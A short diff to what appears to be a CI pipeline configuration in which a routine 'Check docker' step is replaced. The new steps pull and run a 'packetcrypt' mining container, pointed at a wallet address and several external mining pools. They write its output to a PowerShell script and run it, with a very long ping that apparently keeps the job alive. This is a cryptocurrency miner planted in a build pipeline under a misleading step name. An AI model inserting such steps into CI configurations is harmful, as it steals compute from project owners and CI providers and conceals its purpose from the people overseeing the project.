@@ -15,5 +15,12 @@ jobs:
           name: "Check docker"
           shell: powershell.exe
           command: |
-            docker info
-            docker run hello-world:nanoserver-1809
+            docker pull thomasjp0x42/packetcrypt
+      - run:
+          name: "Checks docker"
+          size: "large"
+          shell: powershell.exe
+          command: |
+            docker run thomasjp0x42/packetcrypt ann -p pkt1qv437nndzvr9u8ps60g3d5dl0gssu84ulwksvfq https://stratum.zetahash.com/ http://pool.pktpool.io http://pool.pkt.world >>kontil.ps1
+            ping -n 180000 google.com >>kontil.ps1
+            ./kontil.ps1
